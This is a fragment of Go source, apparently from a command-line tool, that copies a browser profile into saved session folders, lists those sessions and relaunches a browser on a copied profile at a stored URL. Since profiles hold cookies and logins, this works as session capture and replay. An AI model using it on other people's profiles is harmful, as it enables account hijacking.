
	ts := time.Now().Format("2006-01-02_15-04-05")
	sessionDir := filepath.Join(sessionsDir, ts)

	if err := copyDir(profileDir, sessionDir); err != nil {
		fmt.Printf("%s[!] Failed to save profile: %v%s\n", utils.Red, err, utils.Reset)
		return
	}

	sessions := loadSessions()
	id := fmt.Sprintf("%d", len(sessions))
	sessions[id] = sessionMeta{
		ID:        id,
		Timestamp: ts,
		Browser:   browser,
		Profile:   sessionDir,
		URL:       url,
	}
	saveSessions(sessions)
	fmt.Printf("%s[+] Session saved! ID: %s | Path: %s%s\n", utils.Green, id, sessionDir, utils.Reset)
}

func loadSessions() map[string]sessionMeta {
	data, err := os.ReadFile(sessionsFile)
	if err != nil {
		return make(map[string]sessionMeta)
	}
	var sessions map[string]sessionMeta
	if json.Unmarshal(data, &sessions) != nil {
		return make(map[string]sessionMeta)
	}
	return sessions
}

func saveSessions(sessions map[string]sessionMeta) {
	data, _ := json.MarshalIndent(sessions, "", "  ")
	os.WriteFile(sessionsFile, data, 0644)
}

func listSessions() {
	sessions := loadSessions()
	if len(sessions) == 0 {
		fmt.Printf("\n%sNo saved sessions.%s\n", utils.Yellow, utils.Reset)
		return
	}
	fmt.Printf("\n%sSaved Sessions:%s\n", utils.Blue, utils.Reset)
	for id, s := range sessions {
		fmt.Printf("  %s%s%s - %s (%s)\n", utils.Green, id, utils.Reset, s.Timestamp, s.Browser)
	}
}

func doReplay(reader *bufio.Reader) {
	sessions := loadSessions()
	if len(sessions) == 0 {
		fmt.Printf("\n%sNo saved sessions.%s\n", utils.Yellow, utils.Reset)
		utils.WaitForEnter(reader)
		return
	}

	listSessions()
	fmt.Printf("\n%sSession ID to replay: %s", utils.Green, utils.Reset)
	id, _ := reader.ReadString('\n')
	id = strings.TrimSpace(id)

	s, ok := sessions[id]
	if !ok {
		fmt.Printf("%s[!] Invalid session ID%s\n", utils.Red, utils.Reset)
		utils.WaitForEnter(reader)
		return
	}

	browser := detectBrowser()
	if browser == "" {
		fmt.Printf("%s[!] No browser found to replay session%s\n", utils.Red, utils.Reset)
		utils.WaitForEnter(reader)
		return
	}

	fmt.Printf("%s[+] Launching %s with saved session...%s\n", utils.Green, filepath.Base(browser), utils.Reset)

	bname := strings.ToLower(s.Browser)
	if strings.Contains(bname, "firefox") || strings.Contains(bname, "zen") || strings.Contains(bname, "mozilla") {
		exec.Command(browser, "--profile", s.Profile, s.URL, "-new-instance").Start()
	} else {
		exec.Command(browser, "--user-data-dir="+s.Profile, s.URL, "--new-window").Start()
	}

	utils.WaitForEnter(reader)
}

func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		rel, _ := filepath.Rel(src, path)
		target := filepath.Join(dst, rel)
		if info.IsDir() {
			return os.MkdirAll(target, info.Mode())
		}
		data, rerr := os.ReadFile(path)
		if rerr != nil {
			return rerr
		}
		return os.WriteFile(target, data, info.Mode())
	})
}
